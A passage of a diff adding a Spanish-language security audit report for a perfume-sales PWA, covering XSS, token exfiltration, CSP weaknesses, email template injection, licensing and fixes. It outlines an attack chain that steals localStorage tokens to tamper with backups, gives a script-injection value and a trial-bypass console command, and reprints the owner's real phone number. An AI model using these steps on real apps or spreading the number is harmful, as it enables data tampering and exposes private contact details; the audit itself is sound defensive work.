+      El token HMAC (necesario para autenticar el endpoint <code>/backup</code>) y el ECDSA sig (para re-verificar la licencia) están almacenados en localStorage. Un XSS exitoso (V-01) puede exfiltrar ambos. Con el <code>token</code> + <code>code</code>, el atacante puede acceder al backup de la víctima en R2 o restaurar datos maliciosos.
+    </div>
+
+    <div class="section-label">Cadena de Ataque</div>
+    <div class="steps">
+      <ol>
+        <li>Explotar V-01 (XSS vía <code>v.vendedor</code>) para exfiltrar localStorage</li>
+        <li>Obtener <code>pt_license_raw_code</code> (código de licencia) + <code>pt_activated_code</code> (HMAC token)</li>
+        <li>Hacer request a <code>POST /backup</code> con <code>{code, token, data: datos_maliciosos}</code></li>
+        <li>O restaurar <code>GET /backup?code=XXX&amp;token=YYY</code> para sobrescribir datos de la víctima</li>
+      </ol>
+    </div>
+
+    <div class="fix">
+      <strong>Mitigación:</strong> El storage en localStorage de estos tokens es inevitable para que funcione el backup offline. La mejor mitigación es corregir V-01 primero (que es el vector de exfiltración). Adicionalmente, el token HMAC del backup podría incluir un timestamp para que expire en 24-48h, requiriendo re-validación periódica.
+    </div>
+  </div>
+
+  <!-- V-08 -->
+  <div class="card low">
+    <div class="vuln-header">
+      <div>
+        <div class="vuln-id">V-08 · Ruta /backup No Registrada en Worker</div>
+        <h3>El endpoint <code>/backup</code> (backup.js) no está enrutado en worker.js</h3>
+      </div>
+      <span class="badge badge-low">BAJA</span>
+    </div>
+    <div class="tag-row">
+      <span class="badge" style="background:rgba(112,160,224,0.1);color:#a0c0e8;border:1px solid rgba(112,160,224,0.2)">worker.js · Línea 10</span>
+    </div>
+
+    <pre>// worker.js línea 10
+const API_ROUTES = ['/send-notification', '/validate-license', '/send-email'];
+//                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+//                   /backup NO está incluido aquí</pre>
+
+    <div class="detail">
+      El archivo <code>functions/backup.js</code> existe y está bien implementado, pero el entry point <code>worker.js</code> no lo importa ni enruta. Cualquier request a <code>/backup</code> cae al handler de assets estáticos, que retornará 404. La función de backup en la nube no funciona en producción via Cloudflare Workers.
+    </div>
+
+    <div class="fix">
+      <strong>Fix:</strong>
+      <pre>// worker.js — agregar:
+import { onRequestPost as backup, onRequestGet as backupGet } from './functions/backup.js';
+// Y en el router:
+const API_ROUTES = ['/send-notification', '/validate-license', '/send-email', '/backup'];
+// Con handlers para GET y POST según el método</pre>
+    </div>
+  </div>
+
+  <!-- V-09 -->
+  <div class="card med">
+    <div class="vuln-header">
+      <div>
+        <div class="vuln-id">V-09 · CSP con unsafe-eval + unsafe-inline</div>
+        <h3>Content Security Policy permite <code>unsafe-eval</code> y <code>unsafe-inline</code> en scripts</h3>
+      </div>
+      <span class="badge badge-med">MEDIA</span>
+    </div>
+    <div class="tag-row">
+      <span class="badge badge-info">OWASP A05:2021</span>
+      <span class="badge" style="background:rgba(112,160,224,0.1);color:#a0c0e8;border:1px solid rgba(112,160,224,0.2)">_headers · Línea 17</span>
+    </div>
+
+    <pre>// _headers línea 17
+Content-Security-Policy: default-src 'self';
+  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.onesignal.com ...
+//                   ^^^^^^^^^^^^^  ^^^^^^^^^^^^^
+//                   Anula toda la protección XSS que la CSP debería dar</pre>
+
+    <div class="detail">
+      <strong><code>unsafe-inline</code></strong> permite la ejecución de scripts inline (todos los <code>&lt;script&gt;</code> embebidos en el HTML). Necesario para el monolito actual pero hace que la CSP no proteja contra XSS. <strong><code>unsafe-eval</code></strong> permite <code>eval()</code>, <code>Function()</code>, <code>setTimeout(string)</code>. Se necesita para Chart.js u otras librerías. El comentario en <code>_headers</code> lo reconoce: <em>"unsafe-inline es necesario mientras el app sea un monolito HTML"</em>.
+    </div>
+
+    <div class="detail">
+      El resultado es que la CSP actual <strong>no proporciona defensa en profundidad contra XSS</strong>. Si un XSS ocurre (V-01), la CSP no lo bloquea. El único valor real de la CSP actual es el <code>connect-src</code> que limita los dominios de fetch.
+    </div>
+
+    <div class="fix">
+      <strong>Solución a largo plazo:</strong> Migrar los scripts inline a archivos externos y usar nonces/hashes en CSP. Mientras tanto, la CSP actual tiene valor en sus otras directivas (<code>connect-src</code>, <code>img-src</code>, etc.) aunque no proteja contra XSS.
+    </div>
+  </div>
+
+  <!-- V-10 -->
+  <div class="card low">
+    <div class="vuln-header">
+      <div>
+        <div class="vuln-id">V-10 · Número de WhatsApp Hardcodeado</div>
+        <h3>Número de WhatsApp del dueño (<code>59894466577</code>) expuesto en código fuente público</h3>
+      </div>
+      <span class="badge badge-low">BAJA</span>
+    </div>
+    <div class="tag-row">
+      <span class="badge" style="background:rgba(112,160,224,0.1);color:#a0c0e8;border:1px solid rgba(112,160,224,0.2)">index.html · Línea 11702</span>
+    </div>
+
+    <pre>// index.html línea 11701-11702
+const _DEFAULT_WA = "59894466577";  // Número real del desarrollador/dueño</pre>
+
+    <div class="detail">
+      El número de WhatsApp (Uruguay, código +598) del desarrollador o dueño del negocio está hardcodeado en el JS público del HTML. Cualquier persona que descargue la app puede leerlo. No es una vulnerabilidad de seguridad crítica, pero expone datos personales de contacto del operador del negocio.
+    </div>
+
+    <div class="fix">
+      <strong>Fix:</strong> Configurar como variable de entorno o como dato ingresado por el usuario en el onboarding. El campo ya existe en Ajustes (<code>pt_wa_number</code>), simplemente no debe tener un default que sea el número real del dueño.
+    </div>
+  </div>
+
+  <!-- V-11 -->
+  <div class="card med">
+    <div class="vuln-header">
+      <div>
+        <div class="vuln-id">V-11 · Inyección en Templates de Email</div>
+        <h3>Campo <code>data</code> del template de email no completamente sanitizado — inyección HTML en cuerpo de email</h3>
+      </div>
+      <span class="badge badge-med">MEDIA</span>
+    </div>
+    <div class="tag-row">
+      <span class="badge badge-info">CWE-94</span>
+      <span class="badge" style="background:rgba(112,160,224,0.1);color:#a0c0e8;border:1px solid rgba(112,160,224,0.2)">send-email.js · Línea 308</span>
+    </div>
+
+    <pre>// send-email.js línea 306-308
+const safeName = sanitize((toName || to.split("@")[0]).slice(0, 80));
+const tpl = TEMPLATES[template]({ ...data, name: safeName });
+//                                ^^^^^^^^
+//              data se pasa sin sanitizar — sus campos van directo al template HTML</pre>
+
+    <div class="section-label">Template vulnerable</div>
+    <pre>// send-email.js línea 118-119 — trial_reminder template
+${data.ventas  // &lt;-- data.ventas no está sanitizado
+  ? `&lt;p&gt;Durante tu prueba registraste&lt;/p&gt;
+     &lt;p style="..."&gt;${data.ventas} ventas&lt;/p&gt;`  // Inyección si ventas es string malicioso
+  : ""}</pre>
+
+    <div class="detail">
+      El campo <code>toName</code> se sanitiza correctamente con <code>sanitize()</code>. Pero el objeto <code>data</code> completo (que puede incluir <code>daysLeft</code>, <code>ventas</code>, <code>appUrl</code>, <code>waUrl</code>) se pasa directo al template sin pasar por <code>sanitize()</code>.
+      Un cliente que controle el endpoint <code>POST /send-email</code> podría pasar <code>data.ventas = "&lt;script&gt;...&lt;/script&gt;"</code>. Sin embargo, el contexto es un email HTML enviado por Brevo — el riesgo real es que el contenido malicioso aparezca en el email recibido por el destinatario, no en la app.
+    </div>
+
+    <div class="fix">
+      <strong>Fix:</strong> Sanitizar todos los campos de <code>data</code> antes de interpolar en templates. Dado que <code>ventas</code> debe ser un número, validar con <code>parseInt(data.ventas)</code>. Para <code>appUrl</code> y <code>waUrl</code>, validar que sean URLs de dominio conocido.
+    </div>
+  </div>
+
+  <!-- V-12 -->
+  <div class="card low">
+    <div class="vuln-header">
+      <div>
+        <div class="vuln-id">V-12 · _trialTickerInterval en window</div>
+        <h3><code>window._trialTickerInterval</code> expuesto — permite detener el contador de trial desde consola</h3>
+      </div>
+      <span class="badge badge-low">BAJA</span>
+    </div>
+    <div class="tag-row">
+      <span class="badge" style="background:rgba(112,160,224,0.1);color:#a0c0e8;border:1px solid rgba(112,160,224,0.2)">index.html · Línea 12134</span>
+    </div>
+
+    <pre>// index.html línea 12132-12136
+if (window._trialTickerInterval)
+  clearInterval(window._trialTickerInterval);
+window._trialTickerInterval = setInterval(() => {
+  // Esto actualiza el banner del trial cada segundo (modo minutos)
+  ...
+}, 1000);</pre>
+
+    <div class="detail">
+      Solo afecta el modo <code>LICENSE.trialMinutes</code> (modo de testing, no producción). En producción con <code>trialDays: 7</code>, este intervalo no se crea. Sin embargo, si alguien activa el modo demo o testing, desde consola: <code>clearInterval(window._trialTickerInterval)</code> detiene el contador visual. No afecta la lógica de expiración real que se calcula en base a timestamps.
+    </div>
+
+    <div class="fix">
+      <strong>Fix menor:</strong> Guardar el interval ID en una variable local dentro del scope de <code>checkTrial()</code> en lugar de en <code>window</code>.
+    </div>
+  </div>
+
+  <!-- ═══════ CORRECCIONES VERIFICADAS ═══════ -->
+  <div class="divider"></div>
+  <h2>✅ Correcciones de v2 Verificadas y Funcionales</h2>
+  <div class="card ok">
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>
+        <strong>Closure <code>_sec</code> correctamente implementado</strong><br>
+        <span class="detail">Las variables <code>_a</code> y <code>_t</code> viven dentro de un IIFE. No accesibles desde <code>window</code> ni desde consola. Verificado: <code>window._sec</code> → undefined en runtime.</span>
+      </div>
+    </div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>
+        <strong>Verificación ECDSA P-256 client-side funcionando</strong><br>
+        <span class="detail"><code>verifyStoredLicense()</code> usa <code>crypto.subtle.verify()</code> correctamente. La clave pública está embebida en el JS y la privada solo en el servidor Cloudflare. Un <code>sig</code> fake no pasa la verificación.</span>
+      </div>
+    </div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>
+        <strong>CORS restringido correctamente</strong><br>
+        <span class="detail">Todos los endpoints del worker validan origen contra <code>/^https?:\/\/(localhost|127\.0\.0\.1|parfumtrack\.pages\.dev|parfumtrack\.workers\.dev)(:\d+)?$/</code>. Orígenes desconocidos reciben <code>Access-Control-Allow-Origin: null</code>.</span>
+      </div>
+    </div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>
+        <strong>Rate limiting en todos los endpoints backend</strong><br>
+        <span class="detail">/validate-license: 10 req/15min por IP. /backup: 10 req/h por IP + 4 backups/día por código. /send-email: 5 req/h por IP + 3 emails/24h por dirección. /send-notification: 10 req/h por IP + 20/día por subscriptionId. /trial: 20 req/h por IP.</span>
+      </div>
+    </div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>
+        <strong>Trial anclado server-side (funciona cuando hay red)</strong><br>
+        <span class="detail">El endpoint <code>/trial</code> en KV almacena el hash SHA-256 del deviceId y del IP. Devuelve el mínimo entre ambos. El cliente impone el timestamp más antiguo. Previene reset online.</span>
+      </div>
+    </div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>
+        <strong>PIN salt aleatorio por usuario</strong><br>
+        <span class="detail"><code>_ensurePinSalt()</code> genera 16 bytes aleatorios con <code>crypto.getRandomValues()</code> al primer uso. El hash del PIN es SHA-256(salt + pin), específico por dispositivo.</span>
+      </div>
+    </div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>
+        <strong>escapeHTML() aplicado consistentemente en la mayoría de campos</strong><br>
+        <span class="detail">perfume, cliente, fecha, nota, proveedor, vendedor en vc-body, nombres en stock, gastos, caja — todos sanitizados. La omisión de V-01 es puntual, no sistémica.</span>
+      </div>
+    </div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>
+        <strong>Service Worker no cachea endpoints de licencia ni API</strong><br>
+        <span class="detail">El SW excluye explícitamente <code>/validate-license</code>, <code>/send-notification</code>, <code>/send-email</code>, <code>/backup</code> del cache. El HTML usa Network-First.</span>
+      </div>
+    </div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>
+        <strong>Token HMAC de backup usa comparación en tiempo constante</strong><br>
+        <span class="detail"><code>timingSafeEqual()</code> en backup.js implementado correctamente con XOR de caracteres, mitigando timing attacks.</span>
+      </div>
+    </div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>
+        <strong>Activación requiere red — no hay fallback offline</strong><br>
+        <span class="detail">Si <code>fetch("/validate-license")</code> falla, la función retorna con mensaje de error. No hay código de activación hardcodeado ni lógica de fallback local.</span>
+      </div>
+    </div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>
+        <strong>X-Frame-Options, X-Content-Type-Options, Referrer-Policy configurados</strong><br>
+        <span class="detail">Protección contra clickjacking y MIME sniffing activa via <code>_headers</code>.</span>
+      </div>
+    </div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>
+        <strong>Activación revalida ECDSA en cada inicio</strong><br>
+        <span class="detail"><code>initLicenseVerification()</code> corre en cada carga. Si la firma ECDSA falla, borra todos los tokens y requiere reactivación. No hay cache de "ya verifiqué".</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════ ANÁLISIS POR CATEGORÍA OWASP ═══════ -->
+  <div class="divider"></div>
+  <h2>🔎 Análisis OWASP Top 10 (2021)</h2>
+  <div class="card">
+    <table class="summary-table">
+      <thead>
+        <tr><th>OWASP</th><th>Categoría</th><th>Estado</th><th>Notas</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>A01</td>
+          <td>Broken Access Control</td>
+          <td><span class="badge badge-med">PARCIAL</span></td>
+          <td>IndexedDB libre (V-02). PIN bypasseable (V-04). Datos server protegidos.</td>
+        </tr>
+        <tr>
+          <td>A02</td>
+          <td>Cryptographic Failures</td>
+          <td><span class="badge badge-ok">BIEN</span></td>
+          <td>ECDSA P-256 + HMAC-SHA256 correctamente implementados. Claves en env vars.</td>
+        </tr>
+        <tr>
+          <td>A03</td>
+          <td>Injection (XSS)</td>
+          <td><span class="badge badge-high">VULNERABL</span></td>
+          <td>V-01 confirmado (v.vendedor). V-06 potencial (v.descuento). CSP no mitiga (V-09).</td>
+        </tr>
+        <tr>
+          <td>A04</td>
+          <td>Insecure Design</td>
+          <td><span class="badge badge-high">LIMITACIÓN</span></td>
+          <td>V-02 es limitación de diseño de PWA offline-first. V-03 es limitación de trust en cliente.</td>
+        </tr>
+        <tr>
+          <td>A05</td>
+          <td>Security Misconfiguration</td>
+          <td><span class="badge badge-med">PARCIAL</span></td>
+          <td>CSP con unsafe-eval/inline (V-09). V-08 (ruta no registrada). Headers correctos en lo demás.</td>
+        </tr>
+        <tr>
+          <td>A06</td>
+          <td>Vulnerable Components</td>
+          <td><span class="badge badge-ok">N/A</span></td>
+          <td>Dependencias externas: Chart.js (CDN), OneSignal (CDN), Plausible. Sin versiones pinneadas pero bajo riesgo.</td>
+        </tr>
+        <tr>
+          <td>A07</td>
+          <td>Auth/Identification Failures</td>
+          <td><span class="badge badge-med">PARCIAL</span></td>
+          <td>Trial bypasseable offline (V-03). LICENSE mutable (V-05). Licencia server-side robusta.</td>
+        </tr>
+        <tr>
+          <td>A08</td>
+          <td>Software/Data Integrity</td>
+          <td><span class="badge badge-high">RIESGO</span></td>
+          <td>Datos de negocio sin firma de integridad (V-02). CDN scripts sin SRI (Subresource Integrity).</td>
+        </tr>
+        <tr>
+          <td>A09</td>
+          <td>Security Logging</td>
+          <td><span class="badge badge-ok">BIEN</span></td>
+          <td>Logging en Cloudflare Workers. Plausible para eventos. Sin datos sensibles en logs.</td>
+        </tr>
+        <tr>
+          <td>A10</td>
+          <td>SSRF</td>
+          <td><span class="badge badge-ok">N/A</span></td>
+          <td>No hay SSRF posible. Los fetch del worker son a servicios propios (Brevo, OneSignal).</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- ═══════ ANÁLISIS ESPECÍFICO DE SERVICE WORKER ═══════ -->
+  <div class="divider"></div>
+  <h2>⚙️ Análisis de Service Worker</h2>
+  <div class="card ok">
+    <div class="section-label">Hallazgos</div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div><strong>APIs excluidas del cache</strong>: <code>/validate-license</code>, <code>/send-notification</code>, <code>/send-email</code>, <code>/backup</code> no son cacheadas. Cada request va a la red.</div>
+    </div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div><strong>HTML usa Network-First</strong>: siempre intenta la red, fallback al cache solo si falla. No hay riesgo de servir HTML obsoleto indefinidamente.</div>
+    </div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div><strong>OneSignal importado con try/catch</strong>: si el CDN de OneSignal falla, el SW no crashea.</div>
+    </div>
+    <div class="ok-item" style="border-color:rgba(224,144,80,0.3)">
+      <span style="color:var(--high)">⚠</span>
+      <div><strong>Riesgo menor: Cache del HTML puede estar desactualizado</strong>: Si el HTML se actualiza en producción pero el usuario no recarga, puede ejecutar código antiguo. El <code>SKIP_WAITING</code> message y <code>clients.claim()</code> mitigan esto parcialmente.</div>
+    </div>
+    <div class="ok-item" style="border-color:rgba(224,144,80,0.3)">
+      <span style="color:var(--high)">⚠</span>
+      <div><strong>OneSignal CDN sin SRI</strong>: <code>importScripts('https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.sw.js')</code> no tiene hash de integridad. Si el CDN fuera comprometido, se ejecutaría código malicioso en el SW.</div>
+    </div>
+  </div>
+
+  <!-- ═══════ ANÁLISIS DE BACKEND ═══════ -->
+  <div class="divider"></div>
+  <h2>🖧 Análisis de Backend (Cloudflare Workers)</h2>
+  <div class="card ok">
+    <div class="section-label">validate-license.js</div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>KV key: <code>license:${normalizedCode}</code> — sin injection posible dado que el código es validado con <code>length > 64</code> y <code>toUpperCase()</code></div>
+    </div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>Delay de 2000ms en códigos inválidos — frena brute force significativamente</div>
+    </div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>ECDSA signing usa <code>PKCS#8</code> DER desde env var — clave privada nunca en código</div>
+    </div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>Rate limiting KV-based funciona para operaciones normales; limitación: KV eventual consistency puede permitir burst momentáneo</div>
+    </div>
+    <div class="ok-item" style="border-color:rgba(224,144,80,0.3)">
+      <span style="color:var(--high)">⚠</span>
+      <div><strong>usedCount se incrementa en cada activación</strong>: si un usuario activa su licencia múltiples veces (ej: cambia de dispositivo), el contador sube aunque sea el mismo cliente. Puede causar que licencias con <code>maxUses</code> se agoten prematuramente.</div>
+    </div>
+  </div>
+  <div class="card ok" style="margin-top:8px">
+    <div class="section-label">backup.js</div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>Autenticación via HMAC-SHA256 con comparación en tiempo constante (<code>timingSafeEqual</code>)</div>
+    </div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>R2 key: <code>backup/{NORMALIZED_CODE}</code> — un usuario solo puede acceder a su propio backup. No hay path traversal posible (normalizedCode es uppercase alfanumérico con guiones)</div>
+    </div>
+    <div class="ok-item">
+      <span class="ok-icon">✓</span>
+      <div>Límite de 5MB verificado antes del put en R2</div>
+    </div>
+    <div class="ok-item" style="border-color:rgba(224,80,80,0.3)">
+      <span style="color:var(--crit)">!</span>
+      <div><strong>V-08: Esta función no es accesible en producción via worker.js</strong> — ver V-08 para detalles</div>
+    </div>
+  </div>
+
+  <!-- ═══════ ANÁLISIS ESPECÍFICO DEL SISTEMA DE LICENCIAS ═══════ -->
+  <div class="divider"></div>
+  <h2>🔑 Análisis del Sistema de Licencias</h2>
+  <div class="card">
+    <div class="section-label">Flujo de Activación</div>
+    <pre>1. Usuario ingresa código PT-XXXX-YYYY
+2. fetch POST /validate-license → { valid, token (HMAC), sig (ECDSA) }
+3. Si valid === true:
+   - localStorage["pt_activated_sig"]  = sig   (ECDSA)
+   - localStorage["pt_activated_code"] = token  (HMAC)
+   - localStorage["pt_license_raw_code"] = code
+   - _sec.activate(true)
+4. En cada carga: verifyStoredLicense() → crypto.subtle.verify(ECDSA) → _sec.activate(true/false)
+5. Si falla verificación: borra todos los tokens y muestra aviso</pre>
+
+    <div class="section-label">¿Qué pasa si se inyecta {valid:true, sig:"fakesig"}?</div>
+    <div class="detail">
+      <strong>Respuesta: no funciona.</strong> La función <code>activarLicencia()</code> guarda el <code>sig</code> recibido, pero en cada inicio de app, <code>verifyStoredLicense()</code> verifica el <code>sig</code> con la clave pública ECDSA embebida. Un sig falso no pasa la verificación → la app borra los datos y muestra "re-activá tu licencia".
+    </div>
+
+    <div class="detail" style="margin-top:8px">
+      <strong>¿Puede el atacante cachear una respuesta válida en el SW?</strong> No. El SW excluye explícitamente <code>/validate-license</code> del cache. Cualquier request a ese endpoint siempre va a la red.
+    </div>
+
+    <div class="section-label">Debilidad remanente</div>
+    <div class="detail">
+      Si un atacante obtiene un código de licencia válido Y su firma ECDSA (via V-01 XSS + V-07), puede replicar la activación en otro dispositivo. La firma es del código en sí, no del dispositivo. No hay binding device → licencia.
+    </div>
+  </div>
+
+  <!-- ═══════ VEREDICTO ═══════ -->
+  <div class="divider"></div>
+  <div class="verdict orange">
+    <div class="verdict-title" style="color:var(--high)">⚠ VEREDICTO: NO APTO PARA LANZAMIENTO (faltan 4 fixes)</div>
+    <div class="detail">
+      Score actual: <strong>7.1/10</strong>. Umbral de lanzamiento: <strong>8.5/10</strong>. La app mejoró significativamente respecto a v1 y v2, pero 3 vulnerabilidades ALTAS y 1 MEDIA impiden el lanzamiento a producción.
+    </div>
+    <div class="detail" style="margin-top:8px">
+      Las correcciones de v2 funcionan bien — el sistema de licencias ECDSA, el closure <code>_sec</code>, el CORS, el rate limiting y el anclaje server-side del trial son implementaciones correctas. El problema principal es la <strong>confianza depositada en el lado cliente</strong> para datos de negocio críticos.
+    </div>
+  </div>
+
+  <!-- ═══════ PLAN DE ACCIÓN ═══════ -->
+  <h2>🛠 Plan de Acción para Alcanzar 8.5/10</h2>
+  <div class="card">
+    <div class="section-label">🔴 Crítico — Hacer antes del lanzamiento (2-4 horas)</div>
+    <table class="summary-table" style="margin-bottom:16px">
+      <thead><tr><th>Fix</th><th>Acción</th><th>Archivo</th><th>Tiempo</th><th>Score ganado</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><strong>F-01</strong></td>
+          <td>Agregar <code>escapeHTML()</code> a <code>v.vendedor</code> en badge (V-01)</td>
+          <td>index.html:8432</td>
+          <td>5 min</td>
+          <td>+0.5</td>
+        </tr>
+        <tr>
+          <td><strong>F-02</strong></td>
+          <td>Agregar <code>escapeHTML(String(v.descuento))</code> en badge (V-06)</td>
+          <td>index.html:8428</td>
+          <td>5 min</td>
+          <td>+0.1</td>
+        </tr>
+        <tr>
+          <td><strong>F-03</strong></td>
+          <td><code>Object.freeze(LICENSE)</code> inmediatamente después de declaración (V-05)</td>
+          <td>index.html:11692</td>
+          <td>2 min</td>
+          <td>+0.3</td>
+        </tr>
+        <tr>
+          <td><strong>F-04</strong></td>
+          <td>Mover <code>_trialTickerInterval</code> fuera de <code>window</code> (V-12)</td>
+          <td>index.html:12132</td>
+          <td>10 min</td>
+          <td>+0.1</td>
+        </tr>
+        <tr>
+          <td><strong>F-05</strong></td>
+          <td>Registrar <code>/backup</code> en worker.js API_ROUTES (V-08)</td>
+          <td>worker.js:10</td>
+          <td>20 min</td>
+          <td>+0.3</td>
+        </tr>
+        <tr>
+          <td><strong>F-06</strong></td>
+          <td>Cambiar <code>_DEFAULT_WA</code> a placeholder o config (V-10)</td>
+          <td>index.html:11702</td>
+          <td>5 min</td>
+          <td>+0.1</td>
+        </tr>
+        <tr>
+          <td><strong>F-07</strong></td>
+          <td>Sanitizar campos <code>data</code> en send-email.js templates (V-11)</td>
+          <td>send-email.js</td>
+          <td>30 min</td>
+          <td>+0.2</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="section-label">🟡 Importante — Siguiente sprint (1-2 días)</div>
+    <table class="summary-table">
+      <thead><tr><th>Fix</th><th>Acción</th><th>Impacto</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><strong>F-08</strong></td>
+          <td>Agregar SRI (Subresource Integrity) a scripts CDN en SW y HTML</td>
+          <td>Protección contra CDN comprometido</td>
+        </tr>
+        <tr>
+          <td><strong>F-09</strong></td>
+          <td>Documentar limitaciones de seguridad para usuarios (datos locales manipulables)</td>
+          <td>Gestión de expectativas y compliance</td>
+        </tr>
+        <tr>
+          <td><strong>F-10</strong></td>
+          <td>Agregar firma HMAC de integridad a datos de ventas en IndexedDB</td>
+          <td>Detecta manipulación de datos de negocio (V-02)</td>
+        </tr>
+        <tr>
+          <td><strong>F-11</strong></td>
+          <td>Mitigar V-03 offline: usar cache-fecha del SW como ancla adicional</td>
+          <td>Dificulta reset de trial offline</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div style="margin-top:16px;padding:12px;background:var(--info-bg);border:1px solid var(--info-border);border-radius:8px;font-size:13px;color:var(--info)">
+      <strong>Proyección:</strong> Con F-01 a F-07 implementados → Score estimado <strong>8.6/10</strong> → Apto para lanzamiento. Con F-08 a F-11 → <strong>9.1/10</strong>.
+    </div>
+  </div>
+
+  <!-- ═══════ WATERMARK ═══════ -->
+  <div class="watermark">
+    Auditoría de Seguridad v3 · Parfum Track PWA · 13 de junio de 2026<br>
+    Archivos auditados: index.html (15,500+ líneas), worker.js, sw.js, functions/validate-license.js,<br>
+    functions/backup.js, functions/send-email.js, functions/send-notification.js, functions/trial.js,<br>
+    netlify/functions/validate-license.js, netlify/functions/verify-token.js, wrangler.jsonc, _headers<br>
+    <em>Equipo de Seguridad Ofensiva · Análisis manual + revisión de código</em>
+  </div>
+
+</div>
+</body>
+</html>
